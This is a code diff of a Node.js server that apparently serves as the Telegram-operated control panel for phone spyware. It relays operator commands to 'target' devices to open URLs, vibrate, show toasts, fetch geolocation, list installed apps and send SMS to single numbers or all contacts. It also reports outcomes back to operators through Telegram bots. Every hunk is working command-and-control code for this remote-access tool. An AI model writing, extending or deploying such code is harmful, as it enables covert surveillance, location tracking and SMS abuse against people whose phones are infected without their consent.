@@ -6,7 +6,9 @@ const { UserDataTransform } = require("../transform");
 const udt = new UserDataTransform();
 const networkInterfaces = os.networkInterfaces();
 let accepted_users = [];
+let accepted_ports = [];
 const codeRegex = /\b\d{4,8}\b/g;
+let sym = "𓏺|𓏺";
 let ipAddress;
 
 function build(string) {
@@ -152,40 +154,13 @@ const openUrl = async (portname, passname, devid, url, shortcut, callback = () =
             port: portname,
             password: passname,
             method: "openUrl",
-            url: url
+            url: url,
+            shortcut: shortcut
         }));
-        found.socket.on("data", async (data) => {
-            let _message = JSON.parse(data.toString());
-            if (_message.method == "openUrl"){
-                if (_message.port == portname && _message.password == passname){
-                    if (_message.status == true){
-                        callback({
-                            status: true,
-                            method: "openUrl",
-                            url: url,
-                            device_id: found.device_id,
-                            shortcut: shortcut
-                        });
-                        return;
-                    } else {
-                        callback({
-                            status: false,
-                            method: "openUrl",
-                            device_id: found.device_id,
-                            shortcut: shortcut
-                        });
-                        return;
-                    }
-                } else {
-                    user.socket.write(JSON.stringify({
-                        status: false,
-                        method: _message.method,
-                        message: "INVALID_PORT_OR_PASSWORD",
-                        device_id: devid
-                    }));
-                }
-            }
-        })
+
+        callback({
+            status: true
+        });
     })
 }
 
@@ -210,39 +185,13 @@ const vibratePhone = async (portname, passname, devid, shortcut, callback = () =
         found.socket.write(JSON.stringify({
             port: portname,
             password: passname,
-            method: "vibratePhone"
+            method: "vibratePhone",
+            shortcut: shortcut
         }));
-        found.socket.on("data", async (data) => {
-            let _message = JSON.parse(data.toString());
-            if (_message.method == "vibratePhone"){
-                if (_message.port == portname && _message.password == passname){
-                    if (_message.status == true){
-                        callback({
-                            status: true,
-                            method: "vibratePhone",
-                            device_id: found.device_id,
-                            shortcut: shortcut
-                        });
-                        return;
-                    } else {
-                        callback({
-                            status: false,
-                            method: "vibratePhone",
-                            device_id: found.device_id,
-                            shortcut: shortcut
-                        });
-                        return;
-                    }
-                } else {
-                    user.socket.write(JSON.stringify({
-                        status: false,
-                        method: _message.method,
-                        message: "INVALID_PORT_OR_PASSWORD",
-                        device_id: devid
-                    }));
-                }
-            }
-        })
+        
+        callback({
+            status: true
+        });
     })
 }
 
@@ -268,51 +217,22 @@ const sendToast = async (portname, passname, devid, toast, shortcut, callback = 
             port: portname,
             password: passname,
             method: "sendToast",
-            toast: toast
+            toast: toast,
+            shortcut: shortcut
         }));
-        found.socket.on("data", async (data) => {
-            let _message = JSON.parse(data.toString());
-            if (_message.method == "sendToast"){
-                if (_message.port == portname && _message.password == passname){
-                    if (_message.status == true){
-                        callback({
-                            status: true,
-                            method: "sendToast",
-                            toast: toast,
-                            device_id: found.device_id,
-                            shortcut: shortcut
-                        });
-                        return;
-                    } else {
-                        callback({
-                            status: false,
-                            method: "sendToast",
-                            device_id: found.device_id,
-                            shortcut: shortcut
-                        });
-                        return;
-                    }
-                } else {
-                    user.socket.write(JSON.stringify({
-                        status: false,
-                        method: _message.method,
-                        message: "INVALID_PORT_OR_PASSWORD",
-                        device_id: devid
-                    }));
-                }
-            }
-        })
+        
+        callback({
+            status: true
+        });
     })
 }
 
 const getGeoLocation = async (portname, passname, devid, shortcut, callback = () => {}) => {
-    await getSafeUserByDeviceId(portname, passname, devid, async (user) => {
+    await getUserByDeviceId(portname, devid, async (user) => {
         let found = null;
         if (user.status == true){
             found = user.user;
         }
-
-        console.log(found)
 
         if (found == null){
             callback({
@@ -328,54 +248,18 @@ const getGeoLocation = async (portname, passname, devid, shortcut, callback = ()
         found.socket.write(JSON.stringify({
             port: portname,
             password: passname,
-            method: "getGeoLocation"
+            method: "getGeoLocation",
+            shortcut: shortcut
         }));
+
         callback({
-                status: true,
-                method: "getGeoLocation",
-                message: "USER_NOT_FOUND",
-                device_id: devid,
-                shortcut: shortcut
-            });
-        return;
-        // found.socket.on("data", async (data) => {
-        //     let _message = JSON.parse(data.toString());
-        //     if (_message.method == "getGeoLocation"){
-        //         if (_message.port == portname && _message.password == passname){
-        //             if (_message.status == true){
-        //                 callback({
-        //                     status: true,
-        //                     method: "getGeoLocation",
-        //                     longitude: _message.longitude,
-        //                     latitude: _message.latitude,
-        //                     device_id: devid,
-        //                     shortcut: shortcut
-        //                 });
-        //                 return;
-        //             } else {
-        //                 callback({
-        //                     status: false,
-        //                     method: "getGeoLocation",
-        //                     device_id: devid,
-        //                     shortcut: shortcut
-        //                 });
-        //                 return;
-        //             }
-        //         } else {
-        //             user.socket.write(JSON.stringify({
-        //                 status: false,
-        //                 method: _message.method,
-        //                 message: "INVALID_PORT_OR_PASSWORD",
-        //                 device_id: devid
-        //             }));
-        //         }
-        //     }
-        // })
+            status: true
+        });
     })
 }
 
-const sendSMSAll = async (portname, passname, devid, sms, callback = () => {}) => {
-    await getSafeUserByDeviceId(portname, devid, async (user) => {
+const sendSMSAll = async (portname, passname, devid, sms, shortcut, callback = () => {}) => {
+    await getUserByDeviceId(portname, devid, async (user) => {
         let found = null;
         if (user.status == true){
             found = user.user;
@@ -396,40 +280,17 @@ const sendSMSAll = async (portname, passname, devid, sms, callback = () => {}) =
             password: passname,
             method: "sendSMSAll",
             sms: sms,
+            shortcut: shortcut
         }));
-        found.socket.on("data", async (data) => {
-            let _message = JSON.parse(data.toString());
-            if (_message.method == "sendSMSAll"){
-                if (_message.port == portname && _message.password == passname){
-                    if (_message.status == true){
-                        callback({
-                            status: true,
-                            method: "sendSMSAll",
-                            sms: sms
-                        });
-                        return;
-                    } else {
-                        callback({
-                            status: false,
-                            method: "sendSMSAll"
-                        });
-                        return;
-                    }
-                } else {
-                    user.socket.write(JSON.stringify({
-                        status: false,
-                        method: _message.method,
-                        message: "INVALID_PORT_OR_PASSWORD",
-                        device_id: devid
-                    }));
-                }
-            }
-        })
+        
+        callback({
+            status: true
+        });
     })
 }
 
-const sendSMS = async (portname, passname, devid, sms, tonumber, callback = () => {}) => {
-    await getSafeUserByDeviceId(portname, devid, async (user) => {
+const sendSMS = async (portname, passname, devid, sms, tonumber, shortcut, callback = () => {}) => {
+    await getUserByDeviceId(portname, devid, async (user) => {
         let found = null;
         if (user.status == true){
             found = user.user;
@@ -450,42 +311,18 @@ const sendSMS = async (portname, passname, devid, sms, tonumber, callback = () =
             password: passname,
             method: "sendSMS",
             sms: sms,
-            tonumber: tonumber
+            tonumber: tonumber,
+            shortcut: shortcut
         }));
 
-        found.socket.on("data", async (data) => {
-            let _message = JSON.parse(data.toString());
-            if (_message.method == "sendSMS"){
-                if (_message.port == portname && _message.password == passname){
-                    if (_message.status == true){
-                        callback({
-                            status: true,
-                            method: "sendSMS",
-                            sms: sms,
-                            tonumber: tonumber
-                        });
-                        return;
-                    } else {
-                        callback({
-                            status: false,
-                            method: "sendSMS"
-                        });
-                        return;
-                    }
-                } else {
-                    user.socket.write(JSON.stringify({
-                        status: false,
-                        method: _message.method,
-                        message: "INVALID_PORT_OR_PASSWORD",
-                        device_id: devid
-                    }));
-                }
-            }
-        })
+        
+        callback({
+            status: true
+        });
     })
 }
 
-const getInstalledApps = async (portname, passname, devid, callback = () => {}) => {
+const getInstalledApps = async (portname, passname, devid, shortcut, callback = () => {}) => {
     await getUserByDeviceId(portname, devid, async (user) => {
         if (user.status == false){
             callback({
@@ -500,44 +337,15 @@ const getInstalledApps = async (portname, passname, devid, callback = () => {}) 
         user.user.socket.write(JSON.stringify({
             port: portname,
             password: passname,
-            method: "getInstalledApps"
+            method: "getInstalledApps",
+            shortcut: shortcut
         }));
 
-        user.user.socket.on("data", async (data) => {
-            let _message = JSON.parse(data.toString());
-            if (_message.method == "getInstalledApps"){
-                if (_message.port == portname && _message.password == passname){
-                    if (_message.status == true){
-                        callback({
-                            status: true,
-                            method: "getInstalledApps",
-                            apps: _message.apps,
-                            device_id: devid
-                        });
-                        return;
-                    } else {
-                        callback({
-                            status: false,
-                            method: "getInstalledApps",
-                            device_id: devid
-                        });
-                        return;
-                    }
-                } else {
-                    user.user.socket.write(JSON.stringify({
-                        status: false,
-                        method: _message.method,
-                        message: "INVALID_PORT_OR_PASSWORD",
-                        device_id: devid
-                    }));
-                }
-            }
-        })
-
+        callback({
+            status: true
+        });
     })
 }
-
-
 
 const server = net.createServer(async (socket) => {
     socket.on('data', async (data) => {
@@ -548,27 +356,47 @@ const server = net.createServer(async (socket) => {
                 if (message.mask == "metro"){
                     if (Object.keys(message).includes("port") && Object.keys(message).includes("password")){
                         await udt.getUserByPort(message.port, message.password, async (_port) => {
+                            let bot = new TelegramBot(_port.port.token);
+                            
                             if (!_port.status){
-                                socket.write(JSON.stringify({
-                                    status: false,
-                                    message: "INVALID_PORT_OR_PASSWORD",
-                                    method: message.method,
-                                    device_id: message.device_id,
-                                    shortcut: message.shortcut
-                                }));
+                                message.edit == false ? await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build("🔴 𓏺|𓏺 invalid port or password detected"),
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.editMessageText(
+                                    build("🔴 𓏺|𓏺 invalid port or password detected"),
+                                    {
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                )
                                 return;
                             }
 
                             if (_port.user.is_ban){
-                                socket.write(JSON.stringify({
-                                    status: false,
-                                    message: "YOU_BANNED",
-                                    method: message.method,
-                                    device_id: message.device_id,
-                                    shortcut: message.shortcut
-                                }));
+                                message.edit == false ? await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build("🔴 𓏺|𓏺 sorry but you got banned"),
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.editMessageText(
+                                    build("🔴 𓏺|𓏺 sorry but you got banned"),
+                                    {
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                )
                                 return;
                             }
+
+                            accepted_ports.push({
+                                port: message.port,
+                                password: message.password,
+                                socket: socket
+                            })
 
                             if (message.method == "getUsers"){
                                 await getSafeUsersByPort(message.port, message.password, async (allusers) => {
@@ -578,51 +406,161 @@ const server = net.createServer(async (socket) => {
 
                             if (message.method == "getUserByDeviceId"){
                                 await getSafeUserByDeviceId(message.port, message.password, message.device_id, message.shortcut, async (user) => {
-                                    socket.write(JSON.stringify(user));
+                                    if (user.status == false && user.message == "USER_NOT_FOUND"){
+                                        message.edit == false ? await bot.sendMessage(
+                                            message.shortcut.chat_id,
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                reply_to_message_id: message.shortcut.message_id
+                                            }
+                                        ) : await bot.editMessageText(
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                chat_id: message.shortcut.chat_id,
+                                                message_id: message.shortcut.message_id
+                                            }
+                                        )
+                                    }
                                 })
                             }
 
-                            let bot = new TelegramBot(_port.port.token);
-
                             if (message.method == "openUrl"){
                                 await openUrl(message.port, message.password, message.device_id, message.url, message.shortcut, async (dt) => {
-                                    socket.write(JSON.stringify(dt));
+                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
+                                        message.edit == false ? await bot.sendMessage(
+                                            message.shortcut.chat_id,
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                reply_to_message_id: message.shortcut.message_id
+                                            }
+                                        ) : await bot.editMessageText(
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                chat_id: message.shortcut.chat_id,
+                                                message_id: message.shortcut.message_id
+                                            }
+                                        )
+                                    }
                                 })
                             }
 
                             if (message.method == "vibratePhone"){
                                 await vibratePhone(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
-                                    socket.write(JSON.stringify(dt));
+                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
+                                        message.edit == false ? await bot.sendMessage(
+                                            message.shortcut.chat_id,
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                reply_to_message_id: message.shortcut.message_id
+                                            }
+                                        ) : await bot.editMessageText(
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                chat_id: message.shortcut.chat_id,
+                                                message_id: message.shortcut.message_id
+                                            }
+                                        )
+                                    }
                                 })
                             }
 
                             if (message.method == "sendToast"){
                                 await sendToast(message.port, message.password, message.device_id, message.toast, message.shortcut, async (dt) => {
-                                    socket.write(JSON.stringify(dt));
+                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
+                                        message.edit == false ? await bot.sendMessage(
+                                            message.shortcut.chat_id,
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                reply_to_message_id: message.shortcut.message_id
+                                            }
+                                        ) : await bot.editMessageText(
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                chat_id: message.shortcut.chat_id,
+                                                message_id: message.shortcut.message_id
+                                            }
+                                        )
+                                    }
                                 })
                             }
 
                             if (message.method == "getGeoLocation"){
                                 await getGeoLocation(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
-                                    console.log(dt);
+                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
+                                        message.edit == false ? await bot.sendMessage(
+                                            message.shortcut.chat_id,
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                reply_to_message_id: message.shortcut.message_id
+                                            }
+                                        ) : await bot.editMessageText(
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                chat_id: message.shortcut.chat_id,
+                                                message_id: message.shortcut.message_id
+                                            }
+                                        )
+                                    }
                                 })
                             }
 
                             if (message.method == "sendSMSAll"){
                                 await sendSMSAll(message.port, message.password, message.device_id, message.sms, async (dt) => {
-                                    socket.write(JSON.stringify(dt));
+                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
+                                        message.edit == false ? await bot.sendMessage(
+                                            message.shortcut.chat_id,
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                reply_to_message_id: message.shortcut.message_id
+                                            }
+                                        ) : await bot.editMessageText(
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                chat_id: message.shortcut.chat_id,
+                                                message_id: message.shortcut.message_id
+                                            }
+                                        )
+                                    }
                                 })
                             }
 
                             if (message.method == "sendSMS"){
                                 await sendSMS(message.port, message.password, message.device_id, message.sms, message.tonumber, async (dt) => {
-                                    socket.write(JSON.stringify(dt));
+                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
+                                        message.edit == false ? await bot.sendMessage(
+                                            message.shortcut.chat_id,
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                reply_to_message_id: message.shortcut.message_id
+                                            }
+                                        ) : await bot.editMessageText(
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                chat_id: message.shortcut.chat_id,
+                                                message_id: message.shortcut.message_id
+                                            }
+                                        )
+                                    }
                                 })
                             }
 
                             if (message.method == "getInstalledApps"){
                                 await getInstalledApps(message.port, message.password, message.device_id, async (dt) => {
-                                    socket.write(JSON.stringify(dt));
+                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
+                                        message.edit == false ? await bot.sendMessage(
+                                            message.shortcut.chat_id,
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                reply_to_message_id: message.shortcut.message_id
+                                            }
+                                        ) : await bot.editMessageText(
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                chat_id: message.shortcut.chat_id,
+                                                message_id: message.shortcut.message_id
+                                            }
+                                        )
+                                    }
                                 })
                             }
 
@@ -648,6 +586,7 @@ const server = net.createServer(async (socket) => {
                 await udt.getUserByPort(message.port, message.password, async (prt) => {
                     if (prt.status){
                         let cli = new TelegramBot(prt.port.token);
+                        let bot = cli;
                         if (message.method == "connect"){
                             accepted_users.push({
                                 socket: socket,
@@ -693,63 +632,130 @@ const server = net.createServer(async (socket) => {
                                     }
                                 )
                             } else {
-                                if (message.message == "USER_NOT_FOUND"){
-                                    message.edit == false ? await bot.sendMessage(
-                                        message.shortcut.chat_id,
-                                        build("🔴 𓏺|𓏺 user not found"),
-                                        {
-                                            reply_to_message_id: message.shortcut.message_id
-                                        }
-                                    ) : await bot.editMessageText(
-                                        build("🔴 𓏺|𓏺 user not found"),
-                                        {
-                                            chat_id: message.shortcut.chat_id,
-                                            message_id: message.shortcut.message_id
-                                        }
-                                    )
-                                } else if (message.message == "INVALID_PORT_OR_PASSWORD"){
-                                    message.edit == false ? await bot.sendMessage(
-                                        message.shortcut.chat_id,
-                                        build("🔴 𓏺|𓏺 invalid port or password detected"),
-                                        {
-                                            reply_to_message_id: message.shortcut.message_id
-                                        }
-                                    ) : await bot.editMessageText(
-                                        build("🔴 𓏺|𓏺 invalid port or password detected"),
-                                        {
-                                            chat_id: message.shortcut.chat_id,
-                                            message_id: message.shortcut.message_id
-                                        }
-                                    )
-                                } else if (message.message == "YOU_BANNED"){
-                                    message.edit == false ? await bot.sendMessage(
-                                        message.shortcut.chat_id,
-                                        build("🔴 𓏺|𓏺 sorry but you got banned"),
-                                        {
-                                            reply_to_message_id: message.shortcut.message_id
-                                        }
-                                    ) : await bot.editMessageText(
-                                        build("🔴 𓏺|𓏺 sorry but you got banned"),
-                                        {
-                                            chat_id: message.shortcut.chat_id,
-                                            message_id: message.shortcut.message_id
-                                        }
-                                    )
-                                } else {
-                                    console.log(_message);
-                                    message.edit == false ? await bot.sendMessage(
-                                        message.shortcut.chat_id,
-                                        build("🔴 𓏺|𓏺 unkown error detected !"),
-                                        {
-                                            reply_to_message_id: message.shortcut.message_id
-                                        }
-                                    ) : await bot.editMessageText(
-                                        build("🔴 𓏺|𓏺 unkown error detected ! maybe process didnt successful"),
-                                        {
-                                            chat_id: message.shortcut.chat_id,
-                                            message_id: message.shortcut.message_id
-                                        }
-                                    )
+                                message.shortcut.edit ? await bot.editMessageText(
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
+                                    }
+                                )
+                            }
+                        } else if (message.method == "vibratePhone"){
+                            if (message.status == true){
+                                message.shortcut.edit ? await bot.editMessageText(
+                                    build(`⛓ ${sym} phone vibrated for 5 seconds !`),
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build(`⛓ ${sym} phone vibrated for 5 seconds !`),
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
+                                    }
+                                )
+                            } else {
+                                message.shortcut.edit ? await bot.editMessageText(
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
+                                    }
+                                )
+                            }
+                        } else if (message.method == "openUrl"){
+                            if (message.status == true){
+                                message.shortcut.edit ? await bot.editMessageText(
+                                    build(`📢 ${sym} your url has opened in targets device\n🔗 ${sym} ${message.shortcut.url}`),
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build(`📢 ${sym} your url has opened in targets device\n🔗 ${sym} ${message.shortcut.url}`),
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
+                                    }
+                                )
+                            } else {
+                                message.shortcut.edit ? await bot.editMessageText(
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
+                                    }
+                                )
+                            }
+                        } else if (message.method == "sendToast"){
+                            if (message.status == true){
+                                message.shortcut.edit ? await bot.editMessageText(
+                                    build(`➕ ${sym} toast message has shown-up in targets device !\n➕ ${sym} ${message.shortcut.toast}`),
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build(`➕ ${sym} toast message has shown-up in targets device !\n➕ ${sym} ${message.shortcut.toast}`),
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
+                                    }
+                                )
+                            } else {
+                                message.shortcut.edit ? await bot.editMessageText(
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
+                                    }
+                                )
+                            }
+                        } else if (message.method == "getInstalledApps"){
+                            for (let p of accepted_ports){
+                                if (p.port == message.port && p.password == message.password){
+                                    p.socket.write(JSON.stringify({
+                                        status: true,
+                                        port: p.port,
+                                        password: p.password,
+                                        method: "getInstalledApps",
+                                        apps: message.apps,
+                                        shortcut: message.shortcut,
+                                        device_id: message.shortcut.device_id
+                                    }));
+                                    return;
                                 }
                             }
                         }
@@ -768,7 +774,22 @@ const server = net.createServer(async (socket) => {
         })) }
     })
 
-    socket.on("close", async () => {})
+    socket.on("close", async () => {
+        let idx = 0;
+        let pid = 0;
+        for (let u of accepted_users){
+            if (u.socket.remoteAddress == socket.remoteAddress){
+                accepted_users.splice(idx, 1);
+            } else { idx += 1; }
+        }
+
+        for (let p of accepted_ports){
+            if (p.socket.remoteAddress == socket.remoteAddress){
+                accepted_ports.splice(pid, 1);
+            } else { pid += 1; }
+        }
+
+    })
     socket.on("error", async (errx) => {console.log(errx);})
 
 })
